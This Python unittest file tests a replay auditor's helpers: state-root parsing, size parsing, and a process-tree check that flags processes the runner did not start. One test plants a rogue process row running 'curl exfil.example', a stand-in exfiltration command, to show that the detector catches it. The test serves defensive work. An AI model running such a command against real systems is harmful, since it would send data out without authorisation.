from __future__ import annotations

import unittest

from moltwarden.replay import _audit_processes, _last_root, _parse_process_table, _parse_size


class ReplayHelperTests(unittest.TestCase):
    def test_final_state_root_line_is_exact(self):
        root = "a" * 64
        self.assertEqual(_last_root(f"diagnostic\nstate_root sha256:{root}\n".encode()), f"sha256:{root}")
        self.assertIsNone(_last_root(f"state_root sha256:{root.upper()}\n".encode()))
        self.assertIsNone(_last_root(f"state_root sha256:{root}\nextra\n".encode()))

    def test_resource_units_parse(self):
        self.assertEqual(_parse_size("1.5MiB"), 1_572_864)
        self.assertEqual(_parse_size("2 kB"), 2_000)
        self.assertIsNone(_parse_size("unknown"))

    def test_process_tree_accepts_only_the_observed_runner_and_trial(self):
        script = "/bundle/replay.sh"
        rows = [
            {"pid": 10, "ppid": 1, "command": "python3 /opt/warden/runner.py /bundle/replay.sh"},
            {"pid": 11, "ppid": 10, "command": "/bin/sh /bundle/replay.sh"},
            {"pid": 12, "ppid": 11, "command": "sleep 1"},
        ]
        result = _audit_processes([rows], script)
        self.assertTrue(result["runner_seen"])
        self.assertTrue(result["trial_process_seen"])
        self.assertFalse(result["unattributed_process"])
        rogue = rows + [{"pid": 99, "ppid": 1, "command": "curl exfil.example"}]
        self.assertTrue(_audit_processes([rogue], script)["unattributed_process"])

    def test_attack_rerun_process_is_recognized_by_exact_path(self):
        script = "/bundle/attacks/byzantine.sh"
        rows = [
            {"pid": 10, "ppid": 1, "command": "python3 /opt/warden/runner.py " + script},
            {"pid": 11, "ppid": 10, "command": "/bin/sh " + script},
        ]
        self.assertTrue(_audit_processes([rows], script)["trial_process_seen"])

    def test_docker_top_rows_keep_arguments(self):
        rows = _parse_process_table("PID PPID COMMAND\n10 1 python3 /opt/warden/runner.py\n11 10 /bin/sh /bundle/replay.sh\n")
        self.assertEqual(len(rows), 2)
        self.assertIn("/bundle/replay.sh", rows[1]["command"])


if __name__ == "__main__":
    unittest.main()
